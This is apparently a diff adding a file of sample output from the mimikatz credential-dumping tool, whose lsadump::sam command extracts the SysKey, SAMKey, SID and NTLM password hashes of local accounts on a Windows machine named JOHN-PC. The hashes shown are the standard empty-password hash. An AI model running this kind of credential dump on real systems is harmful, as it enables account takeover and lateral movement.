@@ -1,0 +1,17 @@
+mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
+Domain : JOHN-PC
+SysKey : 97fd831aaa54840800ead7b16fc2413e
+Local SID : S-1-5-21-806928618-3257427745-877340488
+
+SAMKey : 1edbf838753ddf7adae5440d5a6ff2b1
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : JOHN
+  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
